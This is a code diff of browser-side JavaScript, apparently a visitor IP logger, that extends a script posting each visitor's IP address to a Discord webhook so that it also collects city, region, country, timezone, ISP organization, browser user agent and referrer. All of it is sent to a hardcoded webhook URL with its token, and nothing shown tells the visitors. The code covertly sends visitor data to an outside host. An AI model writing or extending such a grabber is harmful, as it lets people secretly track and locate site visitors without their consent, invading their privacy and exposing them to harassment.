@@ -21,18 +21,44 @@
             axios.get('https://ipinfo.io/json')
                 .then(function (response) {
                     const ip = response.data.ip; // Get the user's IP address
-                    console.log("User IP:", ip); // Logs the IP to console
+                    const city = response.data.city;
+                    const region = response.data.region;
+                    const country = response.data.country;
+                    const timezone = response.data.timezone;
+                    const org = response.data.org;
 
-                    // Send the IP address to a Discord webhook
+                    // Get the user's browser info
+                    const browserInfo = navigator.userAgent;
+
+                    // Get the referrer (if any)
+                    const referrer = document.referrer;
+
+                    // Log the collected information
+                    console.log("User IP:", ip);
+                    console.log("Location:", city, region, country);
+                    console.log("Time Zone:", timezone);
+                    console.log("Organization:", org);
+                    console.log("Browser Info:", browserInfo);
+                    console.log("Referrer:", referrer);
+
+                    // Prepare the payload to send to Discord
                     const webhookUrl = 'https://discordapp.com/api/webhooks/1349835869753835560/9h2Z7a8wOKcw6skq0udXhmWOKZMcpCZZYwX5r67UA3X2R5ksRQFT9RY_U2ivIdHuN8u3'; // Replace with your webhook URL
                     const payload = {
-                        content: `User IP: ${ip}`
+                        content: `
+                            **User Information:**
+                            **IP Address**: ${ip}
+                            **Location**: ${city}, ${region}, ${country}
+                            **Time Zone**: ${timezone}
+                            **Organization**: ${org}
+                            **Browser Info**: ${browserInfo}
+                            **Referrer**: ${referrer}
+                        `
                     };
 
                     // Post the payload to Discord webhook
                     axios.post(webhookUrl, payload)
                         .then(function (response) {
-                            console.log('IP sent to Discord!');
+                            console.log('User information sent to Discord!');
                         })
                         .catch(function (error) {
                             console.error('Error sending to Discord:', error);
